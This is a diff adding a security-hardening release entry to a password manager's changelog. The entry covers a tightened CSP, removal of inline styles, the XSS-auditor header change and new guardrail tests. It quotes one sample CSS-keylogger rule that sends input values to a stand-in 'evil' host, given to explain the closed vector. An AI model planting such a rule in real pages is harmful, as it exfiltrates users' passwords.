@@ -5,6 +5,78 @@ All notable changes to Passflares are documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [1.0.3] — 2026-05-27
+
+CSP hardening release. Threat-modelled the residual XSS surface against the
+master-password input (the single most valuable secret in the app) and
+closed the CSS-keylogger vector that an HTML-injection bug — if one ever
+slipped past escaping — could otherwise exploit. Also drops the legacy
+browser XSS auditor header that has been used in the wild to selectively
+disable JavaScript on otherwise-safe pages. Picked up follow-on findings
+from Hardenize, ImmuniWeb, and a deliberate code-review pass.
+
+### Changed
+
+- **`Content-Security-Policy` tightened on HTML responses** in
+  [src/worker.ts](src/worker.ts):
+  - `default-src` flipped from `'self'` to `'none'` — deny by default;
+    every resource type now must explicitly opt back in. Anything we
+    forget to declare in future is blocked, not silently allowed.
+  - `'unsafe-inline'` removed from `style-src`. This closes the
+    CSS-keylogger attack vector
+    (`input[value^="a"] { background: url('//evil/?'attr(value)) }`)
+    that any future HTML-injection regression would otherwise expose
+    against the master-password input. Sixteen inline `style="..."`
+    attributes across `public/index.html` and the JS page templates
+    were moved into utility classes in
+    [public/css/base.css](public/css/base.css) and
+    [public/css/components/pages.css](public/css/components/pages.css).
+- **`X-XSS-Protection: 1; mode=block` → `X-XSS-Protection: 0`.** Modern
+  browsers (Chrome 78+, Firefox) already removed their XSS auditors, and
+  Safari's `mode=block` auditor has been used to selectively disable
+  legitimate JavaScript in otherwise-safe pages. Explicitly off is the
+  current best-practice configuration; CSP does the real work.
+- `roleControl` / `removeBtn` helper variables in
+  [public/js/pages/orgs.js](public/js/pages/orgs.js) were inlined into
+  the `innerHTML` template so the new escapeHTML guardrail (below) can
+  walk them statically.
+- Icon-name interpolations (`${iconName}`, `${t.icon}`) now go through
+  `escapeHTML()` everywhere. They were previously safe in practice, but
+  wrapping them is the cheaper defence-in-depth choice and removes the
+  guardrail test's false-positive on these identifiers.
+
+### Added
+
+- **`tests/backend/static-security-audit.test.ts`** gained three new
+  guardrail suites:
+  - No `style="..."` attribute may appear in any shipped HTML file.
+  - No `style="..."` attribute may appear inside any JS template
+    literal.
+  - Every `${...}` interpolation inside an ``innerHTML = `…` ``
+    template must either pass through `escapeHTML(...)` or match the
+    small allowlist of statically-safe shapes (string/number literals,
+    `SCREAMING_SNAKE` constant lookups, nested template literals,
+    ternary/`??`/`||` expressions whose arms are themselves safe). A
+    forgotten escape on a future PR fails CI before it can ship a
+    stored-XSS vector through a vault, entry, or org name.
+- **`worker-security.test.ts`** gained assertions that `default-src` is
+  `'none'`, `style-src` carries no `'unsafe-inline'` (and no
+  `'unsafe-hashes'`), and `X-XSS-Protection` is `0`.
+- **`.github/dependabot.yml`** opens grouped weekly version-update PRs
+  for npm and github-actions ecosystems. Pairs with the
+  Dependabot-security-updates feature already enabled in repo settings,
+  which handles security patches separately.
+
+### Known follow-up (not blocking 1.0.3)
+
+- The e2e suite's `gotoAndSeedLogin` fixture
+  ([tests/e2e/fixtures.ts](tests/e2e/fixtures.ts)) seeds `jwtToken` /
+  `userInfo` into localStorage and reloads, but the auth screen never
+  hides — confirmed pre-existing on the previous tip of `main`, not
+  caused by 1.0.3. Vitest (280/280) is the load-bearing signal for
+  this release. The e2e suite needs a separate fix to its sign-in
+  bypass plumbing.
+
 ## [1.0.2] — 2026-05-26
 
 Follow-up to 1.0.1. A re-scan after 1.0.1 was deployed still flagged the same
